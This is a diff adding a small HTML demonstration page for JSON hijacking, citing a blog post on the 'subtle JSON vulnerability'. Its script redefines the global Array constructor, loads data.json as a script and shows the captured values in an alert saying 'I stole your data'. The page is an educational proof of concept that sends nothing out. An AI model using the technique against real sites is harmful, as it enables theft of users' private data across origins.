@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Subtle JSON vulnerability</title>
+
+  <script type="text/javascript">
+    var secrets;
+
+    Array = function() {
+      secrets = this;
+    };
+  </script>
+
+  <script src="./data.json"
+          type="text/javascript"></script>
+
+  <script type="text/javascript">
+
+    var yourData = '';
+    var i = -1;
+    while(secrets[++i]) {
+      yourData += secrets[i] + ' ';
+    }
+
+    alert('I stole your data: ' + yourData);
+  </script>
+</head>
+<body>
+<h1>JSON Hijacking with Array redefinition</h1>
+<p>As described in the Blog <a href="http://haacked.com/archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx/">You've Been Haacked</a></p>
+
+</body>
+</html>
